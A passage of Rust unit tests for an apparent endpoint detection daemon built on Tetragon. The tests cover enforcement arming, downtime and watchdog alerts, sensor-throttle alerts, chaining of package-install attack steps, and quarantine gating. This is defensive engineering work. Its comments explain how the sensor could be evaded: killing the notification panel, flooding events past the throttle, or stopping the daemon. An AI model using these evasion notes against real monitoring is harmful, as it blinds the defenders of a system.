        // Half-loaded is still not loaded. This is the state the old code
        // armed into.
        pin(&bpf, 3);
        d.arm_tick(1_010);
        assert!(!tetra_calls(dir.path()).iter().any(|c| c.contains("set-mode")));

        // Fully loaded: arm, and confirm against the kernel rather than the
        // exit status.
        pin(&bpf, names.len());
        d.arm_tick(1_020);
        for n in &names {
            assert!(
                tetra_calls(dir.path())
                    .iter()
                    .any(|c| c.starts_with(&format!("tp set-mode {} enforce", n))),
                "{} was never armed",
                n
            );
        }
        assert_eq!(d.arming, Arming::Idle, "arming is done");
        assert!(d.enforcing_unverified.is_empty(), "{:?}", d.enforcing_unverified);
        assert_eq!(d.enforcing_verified.len(), names.len());

        // And `status` says so, which is the surface that lied.
        let st = d.status();
        assert_eq!(st["enforcing_unverified"], json!([]));
        assert_eq!(st["enforcement_unhealthy"], json!(false));
        assert_eq!(st["arming_pending"], json!(false));
        assert_eq!(st["enforcing_verified"].as_array().unwrap().len(), names.len());
    }

    /// A sensor that never takes the mode produces exactly one alert and an
    /// honest `status` — not silence, and not one alert a minute for ever.
    #[test]
    fn arming_that_keeps_failing_is_retried_then_reported_once() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, names) = armed_daemon(dir.path());
        pin(&d.cfg.paths.tetragon_bpf_dir.clone(), names.len());
        // The policies are loaded, and `set-mode` refuses them anyway.
        std::fs::write(dir.path().join("fail"), "").unwrap();
        d.cfg.thresholds.arm_wait_secs = 10;

        d.begin_arming(2_000);
        d.arm_tick(2_000);
        let after_first = tetra_calls(dir.path())
            .iter()
            .filter(|c| c.contains("set-mode"))
            .count();
        assert!(after_first >= names.len(), "every policy was attempted");
        assert_eq!(d.enforcing_unverified.len(), names.len(), "none of them took");
        assert!(matches!(d.arming, Arming::Waiting { .. }), "a failure is retried");

        // Retried, on backoff, inside the window.
        d.arm_tick(2_005);
        assert!(
            tetra_calls(dir.path()).iter().filter(|c| c.contains("set-mode")).count()
                > after_first,
            "the failure must be retried, not accepted"
        );

        // And past the deadline it stops trying and stands by its answer.
        d.arm_tick(2_100);
        assert_eq!(d.arming, Arming::Idle);
        assert_eq!(d.enforcing_unverified.len(), names.len());
        assert!(d.enforcing_verified.is_empty());

        // Verifying again changes nothing about the alert count.
        d.verify_enforcement(2_200);
        d.verify_enforcement(2_300);

        let alerts: Vec<_> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == crate::rules::PROTECTION_CHANGED)
            .collect();
        assert_eq!(
            alerts.len(),
            1,
            "a persistent failure is one alert, not one per tick: {:?}",
            alerts.iter().map(|a| a.explain.what.clone()).collect::<Vec<_>>()
        );
        let ev = alerts[0].explain.evidence.join(" ");
        for n in &names {
            assert!(ev.contains(n.as_str()), "the alert must name {}: {}", n, ev);
        }
        assert!(ev.contains("moatctl status"), "and say what to run: {}", ev);

        // `status` is the surface the panel and `moatctl` read.
        let st = d.status();
        assert_eq!(st["enforcement_unhealthy"], json!(true));
        assert_eq!(
            st["enforcing_rules"].as_array().unwrap().len(),
            st["enforcing_unverified"].as_array().unwrap().len(),
            "everything listed as armed is unverified"
        );
    }

    /// The steady-state check: something reloaded a policy and it dropped back
    /// to the `monitor` its file declares. Nothing announces that, so moat has
    /// to go and look.
    #[test]
    fn verify_reconciles_a_policy_the_kernel_reports_as_monitor() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, names) = armed_daemon(dir.path());
        pin(&d.cfg.paths.tetragon_bpf_dir.clone(), names.len());
        // Four of five are enforcing in the kernel; one quietly is not.
        let slipped = names[2].clone();
        let body: String = names
            .iter()
            .map(|n| format!("{}={}\n", n, if *n == slipped { "monitor" } else { "enforce" }))
            .collect();
        std::fs::write(dir.path().join("modes"), body).unwrap();

        d.verify_enforcement(3_000);

        assert!(
            tetra_calls(dir.path())
                .iter()
                .any(|c| c.starts_with(&format!("tp set-mode {} enforce", slipped))),
            "the one that slipped must be re-armed: {:?}",
            tetra_calls(dir.path())
        );
        assert_eq!(
            tetra_calls(dir.path())
                .iter()
                .filter(|c| c.contains("set-mode"))
                .count(),
            1,
            "and only that one -- re-arming the four that are fine is churn"
        );
        assert!(d.enforcing_unverified.is_empty(), "it came back");
        assert_eq!(d.enforcing_verified.len(), names.len());
        assert!(
            !d.store
                .load()
                .iter()
                .any(|a| a.rule == crate::rules::PROTECTION_CHANGED),
            "a gap moat closed by itself is not an alert"
        );
    }

    /// "Cannot ask the kernel" must never be reported as "the kernel says no".
    #[test]
    fn a_tetra_that_cannot_answer_leaves_the_previous_verdict_alone() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, names) = armed_daemon(dir.path());
        pin(&d.cfg.paths.tetragon_bpf_dir.clone(), names.len());
        let all_enforcing: String =
            names.iter().map(|n| format!("{}=enforce\n", n)).collect();
        std::fs::write(dir.path().join("modes"), all_enforcing).unwrap();
        d.verify_enforcement(4_000);
        assert_eq!(d.enforcing_verified.len(), names.len());

        // Now take the answer away: no `modes` file, so `list` exits 1.
        std::fs::remove_file(dir.path().join("modes")).unwrap();
        d.verify_enforcement(4_100);
        assert!(
            d.enforcing_unverified.is_empty(),
            "silence from tetra is not evidence of a gap"
        );
        assert_eq!(d.enforcing_verified.len(), names.len(), "the last answer stands");
        assert!(!d
            .store
            .load()
            .iter()
            .any(|a| a.rule == crate::rules::PROTECTION_CHANGED));
    }

    /// The field this all turns on, read out of `tetra tracingpolicy list`.
    #[test]
    fn policy_modes_are_read_from_whatever_shape_tetra_reports() {
        // v1.7.1: ListTracingPoliciesResponse.policies[].{name,mode}, with
        // TracingPolicyMode serialised by name.
        let m = parse_policy_modes(
            r#"{"policies":[
                 {"id":"1","name":"moat-a","state":"TP_STATE_ENABLED","mode":"TP_MODE_ENFORCE"},
                 {"id":"2","name":"moat-b","state":"TP_STATE_ENABLED","mode":"TP_MODE_MONITOR"}]}"#,
        )
        .expect("the documented shape");
        assert_eq!(m.get("moat-a").map(String::as_str), Some("enforce"));
        assert_eq!(m.get("moat-b").map(String::as_str), Some("monitor"));

        // The same enum as a number, which is what a plain JSON marshaller
        // emits. UNKNOWN 0, ENFORCE 1, MONITOR 2, MONITOR_ONLY 3 -- read out of
        // the descriptor embedded in /usr/bin/tetra, not guessed.
        let m = parse_policy_modes(r#"[{"name":"moat-a","mode":1},{"name":"moat-b","mode":2}]"#)
            .unwrap();
        assert_eq!(m.get("moat-a").map(String::as_str), Some("enforce"));
        assert_eq!(m.get("moat-b").map(String::as_str), Some("monitor"));

        // And the text table, for a tetra whose JSON output moved. NAMESPACE is
        // empty on every policy moat loads, and tabwriter pads it with spaces,
        // so counting columns from the left lands on the wrong one: the mode is
        // found by shape instead.
        let m = parse_policy_modes(
            "ID  NAME    STATE             FILTERID  NAMESPACE  SENSORS         KERNELMEMORY  MODE             NPOST  NENFORCE  NMONITOR\n\
             1   moat-a  TP_STATE_ENABLED  0                    generic_kprobe  4096          TP_MODE_ENFORCE  0      0         0\n\
             2   moat-b  TP_STATE_ENABLED  0                    generic_kprobe  4096          TP_MODE_MONITOR  0      0         0\n",
        )
        .unwrap();
        assert_eq!(m.get("moat-a").map(String::as_str), Some("enforce"));
        assert_eq!(m.get("moat-b").map(String::as_str), Some("monitor"));

        // Nothing usable is `None`, which callers must not read as "monitor".
        assert!(parse_policy_modes("not json, not a table").is_none());

        // A policy the kernel does not have at all is a policy that is not
        // enforcing -- the exact case that failed seven times on 2026-09-05.
        let want = vec!["moat-a".to_string(), "moat-gone".to_string()];
        let modes = parse_policy_modes(r#"{"policies":[{"name":"moat-a","mode":1}]}"#).unwrap();
        assert_eq!(disagreeing(&want, &modes), vec!["moat-gone".to_string()]);
    }

    /// A hole in the record is itself a finding.
    ///
    /// Stopping the daemon needs root, and `Restart=always` brings it straight
    /// back -- so a root-level shutdown used to leave nothing behind at all:
    /// the process returns, the log resumes, and the minutes in between simply
    /// are not there. Anyone who wants to work unobserved stops the sensor
    /// first, so the gap has to be said out loud.
    #[test]
    fn a_gap_in_the_record_is_reported_on_the_next_start() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        // Never run before: no record, so no hole to report.
        d.last_heartbeat = 0;
        let n = d.store.load().len();
        d.report_downtime();
        assert_eq!(d.store.load().len(), n, "a first start is not an outage");

        // A restart takes seconds; that is not a hole either.
        d.last_heartbeat = d.started.saturating_sub(5);
        d.report_downtime();
        assert_eq!(d.store.load().len(), n, "an ordinary restart is not an outage");

        // Twenty minutes is.
        d.last_heartbeat = d.started.saturating_sub(1200);
        d.report_downtime();
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-x-was-not-running")
            .expect("the outage must be recorded");
        assert_eq!(a.severity, "high");
        assert!(
            a.explain.evidence.iter().any(|e| e.contains("1200 second hole")),
            "the record says how long: {:?}",
            a.explain.evidence
        );
    }

    /// Killing the panel must not be a silent way to switch Moat off.
    ///
    /// Every notification comes from a program in the user's own session, so
    /// anything running as the user can end them with one `pkill` -- no
    /// evasion, no privilege -- while moatd keeps recording faithfully and
    /// nobody ever sees it. moatd is root and cannot be stopped that way, so
    /// the noticing lives here.
    #[test]
    fn moat_notices_when_nothing_is_reading_its_alerts() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let now = util::unix_secs();

        // A surfaced alert nobody has answered.
        let proc = ProcInfo {
            exec_id: "e-x".into(),
            pid: 4242,
            uid: 1000,
            exe: "/tmp/moat-watchdog-no-such-lab/dropper".into(),
            args: String::new(),
            cwd: "/tmp".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            sid: None,
            tty: None,
        };
        let mut f = Finding::new(
            "moat-persist-git-config-write",
            crate::policy::PolicyMeta::fallback("moat-persist-git-config-write"),
            proc,
        );
        f.meta.family = "persist".into();
        f.meta.severity = "high".into();
        f.hook = "file_post_open".into();
        f.file = Some(crate::alert::FileRef {
            path: "/tmp/moat-watchdog-no-such-lab/.git/config".into(),
            sha256: None,
        });
        d.emit(f).expect("the alert must be recorded");
        assert!(
            d.store.load().iter().any(|a| !a.acked && a.surface == "alerts"),
            "precondition: something is waiting for a human"
        );

        // Somebody is watching: nothing to say.
        d.note_watcher(now);
        let n = d.store.load().len();
        d.watchdog_tick(now + 60);
        assert_eq!(d.store.load().len(), n, "a panel that is polling is not a gap");

        // Half an hour of silence with an alert waiting is.
        d.watchdog_tick(now + 3600);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-x-nobody-is-watching")
            .expect("the gap must be recorded");
        assert_eq!(a.severity, "high");

        // Said once, not every tick: this repeats for as long as the panel is
        // gone, and burying the queue would be the same failure again.
        let n = d.store.load().len();
        d.watchdog_tick(now + 3700);
        assert_eq!(d.store.load().len(), n);
    }

    /// A dropped-events message is an alert, not a shrug.
    ///
    /// `cgroup-rate` is 1000 events/s and serde ignores unknown fields, so
    /// `process_throttle` parsed into nothing. An attacker exceeding that rate
    /// gets the sensor to discard their own events -- the one evasion where the
    /// evidence is what goes missing, so the throttle itself has to be said out
    /// loud.
    #[test]
    fn the_sensor_dropping_events_is_itself_an_alert() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_throttle":{"type":"THROTTLE_START","cgroup":"/user.slice/app-noise.scope"},"time":"2026-09-05T10:00:00.000Z"}"#;
        d.handle_line(line);

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-x-sensor-throttled")
            .expect("a throttle must be recorded");
        assert_eq!(a.severity, "high");
        assert!(a.explain.evidence.iter().any(|e| e.contains("app-noise.scope")));

        // Rate limited: a flood throttles continuously and one alert per
        // dropped batch would bury the thing it is warning about.
        let n = d.store.load().len();
        d.handle_line(line);
        d.handle_line(line);
        assert_eq!(d.store.load().len(), n, "one an hour per cgroup, not one per message");

        // THROTTLE_STOP is the recovery, not a new hole.
        d.handle_line(r#"{"process_throttle":{"type":"THROTTLE_STOP","cgroup":"/other"},"time":"2026-09-05T10:00:00.000Z"}"#);
        assert_eq!(d.store.load().len(), n);
    }

    /// The 2026-09-04 AUR miss, pinned.
    ///
    /// `makepkg` egressed to a host outside the registry and ran a dropped
    /// binary out of /tmp. The /tmp exec was `high` and `first_seen` -- the
    /// strongest signal in the run -- but its rule was demoted rule-wide,
    /// because the developer's own `cargo test` trips the same rule all day.
    /// A demotion used to make a step context-only, so the chain was left with
    /// `low`/`medium` triggers, came out `medium`, and nothing reached the
    /// badge. The user ran a full attack and saw no alerts at all.
    ///
    /// Frequency is not consent. Only the user's allowlist silences a step.
    #[test]
    fn a_noise_demoted_alert_is_still_a_chain_trigger() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        // No path here may exist: a `high` alert takes an incident snapshot,
        // which opens and hashes the exe and the file it names.
        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: "/tmp/moat-aur-regression-no-such-lab".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            sid: None,
            tty: None,
        };
        let actor = proc("e-py", 2_257_600, "/usr/bin/no-such-python");
        let makepkg = proc("e-mk", 2_257_581, "/usr/bin/no-such-makepkg");
        let finding = |rule: &str, family: &str, severity: &str, path: String| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), actor.clone());
            f.meta.family = family.into();
            f.meta.severity = severity.into();
            f.hook = "file_post_open".into();
            f.hook_detail = Some("read".into());
            f.ancestry = vec![makepkg.clone()];
            f.file = Some(crate::alert::FileRef { path, sha256: None });
            f
        };

        // Flood the exact shape the attack will later use, so the guard demotes
        // the pattern the attack trips. (The rule-wide "fan-out backstop" that
        // this used to lean on is gone -- see `note_alert` -- because silencing
        // shapes nobody has seen is what caused the 2026-09-04 miss in the
        // first place. The demotion still has to be survivable by a chain, and
        // that is what this test pins.)
        d.baseline.noisy_rule_per_day = 2;
        for i in 0..6 {
            let _ = d.emit(finding(
                "moat-exec-untrusted-tmpfs",
                "exec",
                "high",
                format!("/tmp/moat-aur-regression-no-such-lab/tool{}", i),
            ));
        }
        assert!(
            d.baseline.demoted_rules().contains(&"moat-exec-untrusted-tmpfs".to_string()),
            "precondition: the flood demoted the pattern the attack later trips"
        );

        // Now the attack: the demoted /tmp exec, and egress in the same tree.
        let a = d
            .emit(finding(
                "moat-exec-untrusted-tmpfs",
                "exec",
                "high",
                "/tmp/moat-aur-regression-no-such-lab/browser-helper".to_string(),
            ))
            .expect("a demoted rule still records an alert");
        assert_eq!(
            d.find_alert(&a).unwrap().surface,
            "timeline",
            "precondition: the demotion did put this step on the timeline"
        );
        let b = d
            .emit(finding(
                "moat-x-pkg-egress",
                "net",
                "medium",
                "/tmp/moat-aur-regression-no-such-lab/beacon".to_string(),
            ))
            .expect("the egress must raise an alert");

        let alerts = d.store.load();
        let by_id = |id: &str| alerts.iter().find(|x| x.id == id).unwrap().clone();
        let chain = by_id(&a).chain.clone().expect("the two must correlate");
        assert_eq!(by_id(&b).chain.as_ref().map(|c| c.id.as_str()), Some(chain.id.as_str()));

        // The demoted step is a TRIGGER. This is the whole fix: a rule the
        // guard called noisy is the prime candidate for a sequence, not a thing
        // that can no longer speak.
        assert!(
            chain.steps.iter().all(|s| s.is_trigger()),
            "a noise-guard demotion must not turn a step into context"
        );
        // ...so the chain sees the `high` and says so...
        assert_eq!(crate::alert::severity_rank(&chain.severity) >= 2, true,
                   "chain is {} with a high trigger in it", chain.severity);
        // ...and it reaches the user, which is the part that failed live.
        assert_eq!(by_id(&a).surface, "alerts", "a high chain has to reach the badge");
    }

    // ------------------------------------------------- BASELINE §4, the tier

    /// A `signal` finding, ready to hand to `emit`.
    ///
    /// `severity` is the rule's own and is deliberately `high`: the whole point
    /// of the tier is that it does NOT touch the severity, because chains need
    /// `>= medium` triggers, the baseline learns on severity and rarity does
    /// not see the tier at all.
    fn signal_finding(actor: &ProcInfo, parent: &ProcInfo, path: &str) -> Finding {
        let rule = "moat-exec-untrusted-tmpfs";
        let mut m = crate::policy::PolicyMeta::fallback(rule);
        m.family = "exec".into();
        m.severity = "high".into();
        m.tier = crate::policy::TIER_SIGNAL.into();
        let mut f = Finding::new(rule, m, actor.clone());
        f.hook = "bprm_check_security".into();
        f.ancestry = vec![parent.clone()];
        f.file = Some(crate::alert::FileRef { path: path.into(), sha256: None });
        f
    }

    fn no_such_proc(exec_id: &str, pid: u32, exe: &str) -> ProcInfo {
        ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: "/tmp/moat-tier-test-no-such-dir".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            sid: None,
            tty: None,
        }
    }

    /// The declaration, in every place that consults it.
    ///
    /// `signal` is the sentence "this rule is a building block, not a
    /// detection", said by the rule instead of discovered by a 24 h circuit
    /// breaker that forgets. What it changes and what it must not change are
    /// both load-bearing, so both are asserted here.
    #[test]
    fn a_signal_rule_is_recorded_at_full_severity_and_never_reaches_the_badge() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        let actor = no_such_proc("e-drop", 4_100_100, "/usr/bin/no-such-dropper");
        let parent = no_such_proc("e-sh", 4_100_000, "/usr/bin/no-such-shell");

        let id = d
            .emit(signal_finding(&actor, &parent, "/tmp/moat-tier-test-no-such-dir/x"))
            .expect("a signal rule still records an alert");
        let a = d.find_alert(&id).unwrap();

        assert_eq!(a.tier, "signal", "the tier is on the record (CONTRACT §4)");
        assert_eq!(a.severity, "high", "the tier does NOT move the severity");
        assert_eq!(a.surface, "timeline", "and it never reaches the badge on its own");
        assert_eq!(a.suppressed_by, None, "a signal rule is not a suppression");
        assert!(a.is_building_block());
        assert!(a.incident.is_none(), "no snapshot for a building block");
        assert_eq!(
            d.store.unacked()["high"],
            0,
            "and nothing about it is waiting for a person"
        );
        assert!(
            a.explain.evidence.iter().any(|e| e.starts_with("tier: ")),
            "the alert says why it is on the timeline: {:?}",
            a.explain.evidence
        );

        // The ledger names it, so "recorded" can be read as "how much of this
        // is scaffolding".
        let l = d.store.ledger();
        assert_eq!(l.needs_you, 0);
        assert_eq!(l.recorded, 1);
        assert_eq!(l.signal, 1);
        assert_eq!(l.suppressed, 0);
        assert_eq!(d.status()["ledger"]["signal"], 1);
        assert_eq!(d.status()["triage_pending"], 0, "not a question, not queued");
    }

    /// The noise guard counts what a person can be asked about, and a `signal`
    /// row is not that.
    ///
    /// Before the tier existed this was the ONLY mechanism that could say "this
    /// rule is a building block", and it said it by demoting — so the seven
    /// building-block rules spent their lives tripping a circuit breaker,
    /// raising a `moat-x-noisy-rule` alert each time, and being re-demoted
    /// after every 24 h of quiet. Declaring the tier ends the cycle rather than
    /// making it cheaper.
    #[test]
    fn the_noise_guard_never_counts_a_signal_rule() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        d.baseline.noisy_rule_per_day = 2;
        let actor = no_such_proc("e-drop", 4_100_100, "/usr/bin/no-such-dropper");
        let parent = no_such_proc("e-sh", 4_100_000, "/usr/bin/no-such-shell");
        for i in 0..20 {
            let _ = d.emit(signal_finding(
                &actor,
                &parent,
                &format!("/tmp/moat-tier-test-no-such-dir/x{}", i),
            ));
        }
        assert!(
            d.baseline.demoted_rules().is_empty(),
            "a rule that declared itself a building block cannot also be 'too noisy'"
        );
        assert!(
            !d.store.load().iter().any(|a| a.rule == crate::rules::NOISY_RULE),
            "and no noise complaint is raised about it"
        );
    }

    /// The product's thesis, as a test: a `/tmp` exec is a building block on a
    /// developer's machine and a DETECTION inside a package install.
    ///
    /// This is the one cell where a `signal` rule reaches the badge on its own,
    /// and it is the exact shape that went to the timeline on 2026-09-04 — a
    /// package `preinstall` that downloaded a binary into `/tmp` and ran it,
    /// while the rule sat demoted because `cargo test` trips the same rule all
    /// day.
    #[test]
    fn a_signal_rule_inside_a_package_install_is_a_detection() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        // A real ancestry, because the context comes from the process table.
        // `node` rather than `sh`, so `moat-pkg-subtree-interpreter-spawn` does
        // not also fire and make this test about two rules.
        d.handle_line(&exec_line("e-npm", 4_200_000, "/usr/bin/npm", "install", ""));
        d.handle_line(&exec_line("e-node", 4_200_001, "/usr/bin/node", "install.js", "e-npm"));
        let actor = d.table.get("e-node").expect("the table has it").clone();
        let parent = d.table.get("e-npm").expect("the table has it").clone();

        let id = d
            .emit(signal_finding(&actor, &parent, "/tmp/moat-tier-test-no-such-dir/stage2"))
            .expect("the alert");
        let a = d.find_alert(&id).unwrap();
        assert_eq!(a.context, crate::context::Context::PkgInstall);
        assert!(a.pkg_install_escalation, "the matrix escalated it, and the record says so");
        assert_eq!(a.severity, "high");
        assert_eq!(
            a.surface, "alerts",
            "a /tmp exec inside an install IS a detection: {}",
            a.severity_reason
        );
        assert!(!a.is_building_block(), "so it is not treated as one anywhere");
        assert_eq!(d.store.unacked()["high"], 1);
        assert_eq!(d.store.ledger().needs_you, 1);
    }

    /// A demotion may never move a package-install escalation to the timeline.
    ///
    /// The 2026-09-04 miss, closed in general rather than for one path. The
    /// noise guard is arithmetic about how often a shape fires ON THIS MACHINE;
    /// that is not evidence about what a package install did, and the two must
    /// not be allowed to cancel out. Asserted against the retroactive half
    /// (`quieten_backlog`), which is the half that reaches back over records
    /// already on disk.
    #[test]
    fn a_demotion_never_quietens_a_package_install_escalation() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        d.baseline.noisy_rule_per_day = 2;
        d.handle_line(&exec_line("e-npm", 4_200_000, "/usr/bin/npm", "install", ""));
        d.handle_line(&exec_line("e-node", 4_200_001, "/usr/bin/node", "install.js", "e-npm"));
        let actor = d.table.get("e-node").unwrap().clone();
        let parent = d.table.get("e-npm").unwrap().clone();

        // One pattern, flooded past the threshold. Every one of these is a
        // package-install escalation, so every one is on the badge.
        let mut ids = Vec::new();
        for i in 0..6 {
            ids.push(
                d.emit(signal_finding(
                    &actor,
                    &parent,
                    &format!("/tmp/moat-tier-test-no-such-dir/stage{}", i),
                ))
                .unwrap(),
            );
        }
        assert!(
            d.baseline
                .demoted_rules()
                .contains(&"moat-exec-untrusted-tmpfs".to_string()),
            "precondition: the shape was demoted"
        );
        for id in &ids {
            let a = d.find_alert(id).unwrap();
            assert_eq!(
                a.surface, "alerts",
                "alert {} was escalated by the pkg-install matrix and must stay on the badge",
                id
            );
        }
    }

    /// `chain::Observation.silenced` reads `suppressed_by` and nothing else, so
    /// a `signal` step is a full trigger — which is the entire reason the tier
    /// is safe to declare.
    ///
    /// The lab AUR attack was caught by `moat-exec-untrusted-tmpfs` appearing
    /// in a chain. That rule is now `signal`, so if declaring the tier cost it
    /// its place in a sequence, this change would have traded 14,859 quiet rows
    /// for the one detection that has ever mattered here.
    #[test]
    fn a_signal_step_is_still_a_chain_trigger_and_a_high_chain_still_reaches_the_badge() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        let actor = no_such_proc("e-drop", 4_100_100, "/usr/bin/no-such-dropper");
        let parent = no_such_proc("e-mk", 4_100_000, "/usr/bin/no-such-makepkg");

        let a = d
            .emit(signal_finding(&actor, &parent, "/tmp/moat-tier-test-no-such-dir/helper"))
            .expect("the signal step");
        assert_eq!(d.find_alert(&a).unwrap().surface, "timeline", "precondition");

        // A second family in the same tree.
        let mut m = crate::policy::PolicyMeta::fallback("moat-x-pkg-egress");
        m.family = "net".into();
        m.severity = "medium".into();
        let mut f = Finding::new("moat-x-pkg-egress", m, actor.clone());
        f.hook = "file_post_open".into();
        f.hook_detail = Some("read".into());
        f.ancestry = vec![parent.clone()];
        f.file = Some(crate::alert::FileRef {
            path: "/tmp/moat-tier-test-no-such-dir/beacon".into(),
            sha256: None,
        });
        let b = d.emit(f).expect("the egress step");

        let chain = d.find_alert(&a).unwrap().chain.expect("the two must correlate");
        assert_eq!(d.find_alert(&b).unwrap().chain.map(|c| c.id), Some(chain.id.clone()));
        assert!(
            chain.steps.iter().all(|s| s.is_trigger()),
            "a signal tier must not turn a step into context"
        );
        assert!(
            crate::alert::severity_rank(&chain.severity) >= 2,
            "chain is {} with a high signal trigger in it",
            chain.severity
        );
        assert_eq!(
            d.find_alert(&a).unwrap().surface,
            "alerts",
            "and a high chain re-stamps its trigger onto the badge"
        );
    }

    // ------------------------------------------- the kill gate and quarantine

    /// Put a finished alert straight into the store, so a chain can be built
    /// over facts (rarity, family, path) the test chooses.
    fn stored_alert(
        d: &mut Daemon,
        id: &str,
        rule: &str,
        family: &str,
        path: &str,
        rarity: crate::rarity::Rarity,
    ) -> Alert {
        let mut a = crate::alert::tests_support::demo_alert(id);
        a.rule = rule.into();
        a.family = family.into();
        a.severity = "high".into();
        a.rarity = rarity;
        a.file = Some(crate::alert::FileRef { path: path.into(), sha256: None });
        a.process.pid = 4_300_000 + (id.len() as u32);
        d.store.append_alert(&a).unwrap();
        a
    }

    fn chain_over(d: &Daemon, alerts: &[Alert], severity: &str) -> crate::chain::Chain {
        let steps: Vec<crate::chain::Step> = alerts
            .iter()
            .map(|a| crate::chain::Step {
                alert: a.id.clone(),
                ts: a.ts.clone(),
                family: a.family.clone(),
                rule: a.rule.clone(),
                severity: a.severity.clone(),
                title: a.title.clone(),
                pid: a.process.pid,
                exe: a.process.exe.clone(),
                role: "trigger".into(),
            })
            .collect();
        let _ = d;
        let mut families: Vec<String> = alerts.iter().map(|a| a.family.clone()).collect();
        families.sort();
        families.dedup();
        crate::chain::Chain {
            v: 1,
            id: "01CHAINQUARANTINE".into(),
            ancestor: crate::alert::Ancestor {
                pid: 4_299_999,
                exe: "/usr/bin/no-such-makepkg".into(),
            },
            families,
            severity: severity.into(),
            severity_base: "high".into(),
            severity_reason: "r".into(),
            first_ts: util::now_rfc3339(),
            last_ts: util::now_rfc3339(),
            span_secs: 1,
            steps_total: steps.len(),
            triggers_total: steps.len(),
            members: steps.iter().map(|s| s.alert.clone()).collect(),
            steps,
            truncated: false,
            summary: "s".into(),
        }
    }

    fn decisions(d: &Daemon) -> Vec<Value> {
        let path = d.cfg.paths.state_dir.join("decisions.jsonl");
        std::fs::read_to_string(path)
            .unwrap_or_default()
            .lines()
            .filter_map(|l| serde_json::from_str(l).ok())
            .collect()
    }

    /// Quarantine passes the kill gate, and says so when it refuses.
    ///
    /// On 2026-09-05 at 22:03Z a `critical` chain raised by this project's own
    /// `cargo test` run made the daemon try to quarantine
    /// `…/target/release/moatctl` — the developer's build output — and it
    /// failed only because the mount was read-only. The kill gate had already
    /// looked at chains of that shape and refused them; quarantine had no gate
    /// at all. Moving a file aside is not the gentle option, so it is the same
    /// decision, recorded in the same words.
    #[test]
    fn a_chain_the_kill_gate_would_spare_is_not_quarantined_either() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.enabled = true;

        // Real files, under the tempdir (which is under /tmp, one of the roots
        // quarantine will act in). They must still exist afterwards.
        let build_output = dir.path().join("target-release-moatctl");
        let unit = dir.path().join("some.service");
        std::fs::write(&build_output, b"ELF-ish").unwrap();
        std::fs::write(&unit, b"[Unit]").unwrap();

        // One novel family and one the machine has seen: exactly the shape the
        // kill gate spares, and exactly a developer's build.
        let a = stored_alert(
            &mut d,
            "01QA0000000000000000000000",
            "moat-exec-untrusted-tmpfs",
            "exec",
            &build_output.to_string_lossy(),
            crate::rarity::Rarity::FirstSeen,
        );
        let b = stored_alert(
            &mut d,
            "01QB0000000000000000000000",
            "moat-persist-autostart-write",
            "persist",
            &unit.to_string_lossy(),
            crate::rarity::Rarity::Common,
        );
        let c = chain_over(&d, &[a.clone(), b.clone()], "high");
        d.quarantine_chain_artifacts(&c);

        assert!(build_output.exists(), "the developer's build output is still there");
        assert!(unit.exists());
        assert_eq!(d.find_alert(&a.id).unwrap().action_taken, "none");
        let refusals: Vec<Value> = decisions(&d)
            .into_iter()
            .filter(|r| r["verdict"] == "quarantine_spared")
            .collect();
        assert_eq!(refusals.len(), 1, "the refusal is a record, not a log line");
        assert!(
            refusals[0]["reason"]
                .as_str()
                .unwrap()
                .contains("this machine has seen this shape before"),
            "the same sentence the kill gate prints: {}",
            refusals[0]["reason"]
        );
    }

    /// ...and a chain that WOULD be killed is quarantined, so the gate is a
    /// gate and not an off switch.
    #[test]
    fn a_chain_that_would_kill_does_quarantine() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.enabled = true;
        let dropper = dir.path().join("browser-helper");
        std::fs::write(&dropper, b"ELF-ish").unwrap();

        let a = stored_alert(
            &mut d,
            "01QC0000000000000000000000",
            "moat-exec-untrusted-home",
            "exec",
            &dropper.to_string_lossy(),
            crate::rarity::Rarity::FirstSeen,
        );
        let b = stored_alert(
            &mut d,
            "01QD0000000000000000000000",
            "moat-persist-autostart-write",
            "persist",
            &dir.path().join("no-such-file").to_string_lossy(),
            crate::rarity::Rarity::FirstSeen,
        );
        let c = chain_over(&d, &[a.clone(), b.clone()], "critical");
        assert!(
            crate::contain::worth_killing_for(
                &c.severity,
                &[
